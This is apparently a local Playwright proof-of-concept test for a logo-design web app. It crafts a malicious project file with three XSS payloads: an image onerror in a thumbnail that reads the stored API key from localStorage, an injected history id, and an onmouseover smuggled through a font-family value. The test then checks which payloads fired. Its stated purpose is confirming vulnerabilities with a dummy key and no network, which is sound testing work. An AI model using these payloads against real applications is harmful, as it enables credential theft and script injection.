// Local proof only: dummy key, no network (all non-local requests are aborted), effect = a flag set in the page.
const { chromium } = require("playwright"); const { open } = require("../../tests/helpers");
const base = { layers: [{ id: "a", name: "A", group: "mark", fill: "#000000", visible: true, locked: false, subs: [[{ x: 0, y: 0, i: null, o: null }, { x: 10, y: 0, i: null, o: null }, { x: 10, y: 10, i: null, o: null }]] }] };
const live = JSON.parse(JSON.stringify(base)); live.layers[0] = Object.assign(live.layers[0], { kind: "live", live: { str: "X", family: 'Inter" onmouseover="window.__pwn3=1" x="', w0: 10, h0: 10, bx: 0, by: 0, dir: "ltr" }, subs: [[{x:0,y:0,i:null,o:null},{x:100,y:0,i:null,o:null},{x:100,y:100,i:null,o:null},{x:0,y:100,i:null,o:null}]] });
const hist = Object.assign(JSON.parse(JSON.stringify(base)), { hist: [{ id: 'h"><img src=x onerror="window.__pwn2=1">', label: "x", on: true, at: 1, d: { ents: {}, pos: {}, doc: {} } }] });
const file = { format: "atelier-logo", v: 1, projects: [
  { id: "p1", name: "Vignette", doc: base, thumb: '<img src=x onerror="window.__pwn1=localStorage.getItem(\'atelier-logo-api-key\')">' },
  { id: "p2", name: "Historique", doc: hist }, { id: "p3", name: "Texte", doc: live } ] };
(async () => { const b = await chromium.launch(); const { page: p, ctx } = await open(b, { init: () => localStorage.setItem("atelier-logo-api-key", "sk-ant-DUMMY-KEY-0000000000000000000000") });
  await ctx.route(u => !/^http:\/\/127\.0\.0\.1/.test(u.toString()), r => r.abort());
  await p.click("#projBtn"); await p.setInputFiles("#projOpenFile", { name: "x.atelier.json", mimeType: "application/json", buffer: Buffer.from(JSON.stringify(file)) }); await p.waitForTimeout(800);
  const r1 = await p.evaluate(() => window.__pwn1 || null);
  // open the « Historique » project, then the history panel
  await p.evaluate(() => { const b = [...document.querySelectorAll("[data-open]")].find(x => x.dataset.open === "p2"); b && b.click(); }); await p.waitForTimeout(800);
  await p.evaluate(() => document.querySelectorAll("dialog[open]").forEach(d => d.close())); await p.evaluate(() => document.querySelector("#histBtn").click()); await p.waitForTimeout(300);
  const r2 = await p.evaluate(() => window.__pwn2 || null);
  await p.click("#projBtn"); await p.evaluate(() => { const b = [...document.querySelectorAll("[data-open]")].find(x => x.dataset.open === "p3"); b && b.click(); }); await p.waitForTimeout(800);
  const r3 = await p.evaluate(() => { const t = document.querySelector("#art text"); if (t) t.dispatchEvent(new MouseEvent("mouseover")); return [!!t, window.__pwn3 || null, t ? t.getAttribute("onmouseover") : null]; });
  console.log(JSON.stringify({ thumbnail_xss_read_key: r1, history_id_xss: r2, live_family_attr_injection: r3 })); await b.close(); })();
